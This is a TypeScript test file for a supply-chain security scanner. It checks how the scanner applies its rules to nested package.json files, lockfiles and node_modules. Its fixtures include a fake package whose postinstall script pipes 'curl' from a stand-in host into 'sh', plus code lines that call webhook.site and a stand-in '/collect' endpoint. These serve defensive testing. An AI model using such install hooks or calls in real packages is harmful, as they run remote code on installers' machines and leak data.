/** How scanDirectory routes files to checks: path scoping, node_modules rules, nested files. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import type { ScanResult } from "../src/scan.js";
import { testCtx } from "./helpers.js";

function project(files: Record<string, string>): string {
  const d = mkdtempSync(join(tmpdir(), "ws-wire-"));
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), c);
  }
  return d;
}

const hits = (r: ScanResult, ruleId: string): string[] => r.findings.filter((f) => f.ruleId === ruleId).map((f) => f.file ?? "").sort();
const EVIL_PKG = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
const IOC_LOCK = JSON.stringify({
  lockfileVersion: 3,
  packages: { "node_modules/wormsign-test-marker": { version: "1.0.0", resolved: "https://registry.npmjs.org/wormsign-test-marker/-/wormsign-test-marker-1.0.0.tgz", integrity: "sha512-AAAA" } },
});

test("scan: an ignore prefix covers its directory, not a sibling that shares the prefix", () => {
  const d = project({ "fx/package.json": EVIL_PKG, "fxevil/package.json": EVIL_PKG });
  for (const prefix of ["fx", "fx/"]) {
    const r = scanDirectory(d, testCtx(), { nodeModules: false, ignorePrefixes: [prefix] });
    assert.deepEqual(hits(r, "WS-LC-001"), ["fxevil/package.json"], prefix);
  }
});

test("scan: nested project package.json and lockfiles are checked; node_modules ones by the installed-package rules only", () => {
  const d = project({
    "packages/a/package.json": EVIL_PKG,
    "packages/a/package-lock.json": IOC_LOCK,
    "node_modules/x/package-lock.json": IOC_LOCK,
    "node_modules/x/package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
    "node_modules/x/dist/package.json": JSON.stringify({ name: "wormsign-test-marker", version: "1.0.0", scripts: { postinstall: "echo" } }),
  });
  const r = scanDirectory(d, testCtx(), { nodeModules: true });
  assert.deepEqual(hits(r, "WS-LC-001"), ["packages/a/package.json"]);
  assert.deepEqual(hits(r, "WS-LK-001"), ["packages/a/package-lock.json"], "a lockfile shipped inside a dependency is not what gets installed");
  assert.deepEqual(hits(r, "WS-NM-001"), [], "dist/package.json is not an installed package");
});

test("scan: in node_modules only IOC endpoints are reported, generic hosts are not", () => {
  const d = project({
    "node_modules/x/index.js": 'a("https://webhook.site/abc"); b("https://wormsign-marker.invalid/collect")',
    "src/index.js": 'a("https://webhook.site/abc")',
  });
  const r = scanDirectory(d, testCtx(), { nodeModules: true });
  assert.deepEqual(hits(r, "WS-EX-001"), ["src/index.js"]);
  assert.deepEqual(hits(r, "WS-EX-002"), ["node_modules/x/index.js"]);
});

test("scan: a pnpm directory: dependency is local, so it needs no registry host or integrity", () => {
  const lock = [
    "lockfileVersion: '9.0'",
    "",
    "packages:",
    "",
    "  local-pkg@1.0.0:",
    "    resolution: {directory: ../local-pkg, type: directory}",
    "",
    "  remote-pkg@1.0.0:",
    "    resolution: {tarball: https://registry.npmjs.org/remote-pkg/-/remote-pkg-1.0.0.tgz}",
    "",
  ].join("\n");
  const r = scanDirectory(project({ "pnpm-lock.yaml": lock }), testCtx(), { nodeModules: false });
  assert.deepEqual(
    r.findings.filter((f) => f.ruleId.startsWith("WS-LK-")).map((f) => `${f.ruleId} ${f.key.split(" ")[0]}`),
    ["WS-LK-003 remote-pkg@1.0.0"],
    "positive control: the registry entry without integrity is still reported",
  );
});
